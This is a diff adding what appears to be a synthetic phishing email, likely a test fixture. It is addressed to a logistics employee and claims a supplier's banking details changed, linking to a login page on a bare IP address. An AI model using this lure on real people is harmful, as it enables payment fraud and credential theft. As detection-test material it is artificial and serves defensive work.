@@ -1,0 +1,22 @@
+From: "Castellan Packaging Accounts" <accounts@castellan-pack.eu>
+To: m.lin@northwind-logistics.com
+Subject: Important: account update needed
+Date: Tue, 24 Mar 2026 02:45:00 +0000
+Message-ID: <2881643703@castellan-pack.eu>
+Authentication-Results: mx.northwind-logistics.com; spf=pass
+ smtp.mailfrom=castellan-pack.eu; dkim=pass header.d=castellan-pack.eu;
+ dmarc=pass
+Received: from mail.northwind-logistics.com (mail.northwind-logistics.com
+ [198.51.100.24]) by mx.northwind-logistics.com with ESMTPS id cf84cc; Tue, 24
+ Mar 2026 02:45:00 +0000
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+MIME-Version: 1.0
+
+Mei,
+
+Please note our banking details have changed following a treasury restructure.
+Verify here: http://203.0.113.45/secure/login.php
+Let me know if you need anything else.
+
+Best regards,
